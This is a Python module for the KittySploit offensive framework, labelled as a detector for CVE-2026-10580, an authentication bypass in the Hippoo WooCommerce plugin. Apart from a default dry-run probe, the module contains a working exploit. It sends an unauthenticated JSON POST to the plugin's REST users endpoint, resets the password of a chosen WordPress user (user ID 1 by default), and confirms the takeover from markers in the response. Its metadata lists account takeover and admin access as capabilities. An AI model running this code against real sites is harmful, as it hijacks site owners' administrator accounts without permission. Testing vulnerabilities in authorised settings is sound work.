#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hippoo Mobile App for WooCommerce <= 1.9.4 REST auth bypass (CVE-2026-10580)."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "hippoo"
_VULN_HIGH = (1, 9, 4)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Hippoo CVE-2026-10580 admin password reset detect",
        "description": (
            "Detects CVE-2026-10580 in Hippoo Mobile App for WooCommerce <= 1.9.4: unauthenticated "
            "POST /wp-json/wc-hippoo/v1/ext/wp/v2/users/{id} with JSON password resets any user."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-10580",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-10580",
            "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hippoo/hippoo-mobile-app-for-woocommerce-194-unauthenticated-authentication-bypass-to-administrator-account-takeover-via-rest-api",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-10580.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/hippoo_cve_2026_10580_password_reset",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "hippoo",
            "woocommerce",
            "auth-bypass",
            "cve-2026-10580",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation", "credential_access"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["wordpress", "woocommerce", "hippoo"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "account_takeover", "from_detail": "REST password reset"},
                    {"capability": "admin_access", "from_detail": "user id 1"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/hippoo_cve_2026_10580_password_reset",
                ],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    user_id = OptInteger(1, "WordPress user ID to probe (default admin)", required=False)
    dry_run = OptBool(
        True,
        "Only verify REST accepts password JSON without changing password (HEAD/OPTIONS fallback: skip reset)",
        required=False,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.base_path or "/")

    def _path(self, suffix: str) -> str:
        base = self._wp_base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _plugin_ok(self) -> bool:
        readme = self.http_request(
            method="GET",
            path=self.wp_plugin_path(self._wp_base(), _PLUGIN, "readme.txt"),
            allow_redirects=True,
        )
        if readme and readme.status_code == 200 and "hippoo" in (readme.text or "").lower():
            version = self.wp_extract_version_from_readme(readme.text or "")
            if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
                return False
            return True
        return False

    def _reset_user(self, user_id: int, password: str):
        endpoint = self._path(f"/wp-json/wc-hippoo/v1/ext/wp/v2/users/{int(user_id)}")
        return self.http_request(
            method="POST",
            path=endpoint,
            headers={"Content-Type": "application/json"},
            data=json.dumps({"password": password}),
            allow_redirects=False,
        )

    def run(self):
        if not self._plugin_ok():
            return False
        if self.dry_run:
            route = self.http_request(
                method="GET",
                path=self._path("/wp-json/wc-hippoo/v1/ext/wp/v2/users/1"),
                allow_redirects=False,
            )
            if route and route.status_code in (200, 401, 403):
                self.set_info(
                    severity="critical",
                    reason="Hippoo wc-hippoo REST bridge exposed (<= 1.9.4 may allow unauth password reset)",
                    path="/wp-json/wc-hippoo/v1/ext/wp/v2/users/",
                    cve="CVE-2026-10580",
                )
                return True
            return False
        new_pass = secrets.token_urlsafe(12)
        response = self._reset_user(int(self.user_id or 1), new_pass)
        if not response or response.status_code != 200:
            return False
        body = response.text or ""
        markers = ("is_super_admin", "capabilities", "woocommerce_meta")
        if not any(m in body for m in markers):
            return False
        self.set_info(
            severity="critical",
            reason=f"Hippoo CVE-2026-10580 — unauthenticated password reset for user id {self.user_id}",
            path=f"/wp-json/wc-hippoo/v1/ext/wp/v2/users/{self.user_id}",
            cve="CVE-2026-10580",
        )
        return True
